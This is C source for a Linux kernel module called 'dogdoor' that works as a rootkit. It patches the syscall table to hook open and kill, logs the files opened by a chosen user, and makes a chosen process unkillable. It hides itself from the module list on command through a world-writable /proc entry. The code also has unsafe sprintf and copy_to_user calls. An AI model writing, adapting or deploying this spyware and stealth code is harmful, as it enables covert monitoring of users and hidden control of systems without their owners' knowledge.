#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/list.h>


MODULE_LICENSE("GPL");


void **sctable;
char spying_on[10];
char record[1000];
char tmp[1000];
int procid;
int i = 0;
struct list_head *p;


asmlinkage int (*orig_sys_open)(const char __user *filename, int flags, umode_t mode);

asmlinkage int dogdoor_sys_open(const char __user *filename, int flags, umode_t mode) {
  char fname[100];
  char current_user[10];

  copy_from_user(fname, filename, 100);

	sprintf(current_user, "%d", (int)current_uid().val);

	if(strlen(record)+strlen(fname) < 500 && strcmp(spying_on, current_user) == 0) {
		*tmp = 0; // to add the most recently open file at the beginning of records, temporarily save previous records to 'tmp'
		sprintf(tmp, record);
		sprintf(record, "%s&", fname);
		strcat(record, tmp);
	}

	return orig_sys_open(filename, flags, mode);
}

asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);

asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) {
	if(procid != pid) {
		if(sig == 0) {
			procid = pid;
			return orig_sys_kill(pid, 0);
		}

		else
			return orig_sys_kill(pid, sig);
	}

	if(procid == pid && sig == 0) {
		procid = 0;
	}

	return -1; // in case someone attempts to kill the immortal process
}

static
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0;
}

static
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) {
	char buf[1000];
  ssize_t toread;

  sprintf(buf, "%s", record);
  toread = strlen(record) >= *offset + size ? size : strlen(record) - *offset;

	if (copy_to_user(ubuf, buf, strlen(record)))
    return -EFAULT;

  *offset = *offset + toread;
  return toread;
}


static
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) {
  char buf[128];

  if (*offset != 0 || size > 128)
    return -EFAULT;

  if (copy_from_user(buf, ubuf, size))
    return -EFAULT;

  if(strcmp(buf, "hide") == 0) { // hide 'dogdoor' from module lists
    p = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
  }

  if(strcmp(buf, "unhide") == 0) // make 'dogdoor' appeared again from module lists
    list_add(&THIS_MODULE->list, p);

  else {
    strncpy(spying_on, buf, strlen(buf));
    *record = 0; // if a user wants to monitor someone else, we have to clear records written before
  }

	*offset = strlen(buf);
  return *offset;
}

static const struct file_operations dogdoor_fops = {
  .owner =        THIS_MODULE,
  .open =         dogdoor_proc_open,
  .read =         dogdoor_proc_read,
  .write =        dogdoor_proc_write,
  .llseek =       seq_lseek,
  .release =      dogdoor_proc_release,
};

static
int __init dogdoor_init(void) {
  unsigned int level;
  pte_t *pte;

  proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops);

  sctable = (void*) kallsyms_lookup_name("sys_call_table");
  orig_sys_open = sctable[__NR_open];
  orig_sys_kill = sctable[__NR_kill];

  pte = lookup_address((unsigned long) sctable, &level);

  if (pte->pte &~ _PAGE_RW)
    pte->pte |= _PAGE_RW;

  sctable[__NR_open] = dogdoor_sys_open;
  sctable[__NR_kill] = dogdoor_sys_kill;

	return 0;
}

static
void __exit dogdoor_exit(void) {
  unsigned int level;
  pte_t * pte;
  remove_proc_entry("dogdoor", NULL);

  sctable[__NR_open] = orig_sys_open;
  sctable[__NR_kill] = orig_sys_kill;
  pte = lookup_address((unsigned long) sctable, &level);
  pte->pte = pte->pte &~ _PAGE_RW;
}


module_init(dogdoor_init);
module_exit(dogdoor_exit);

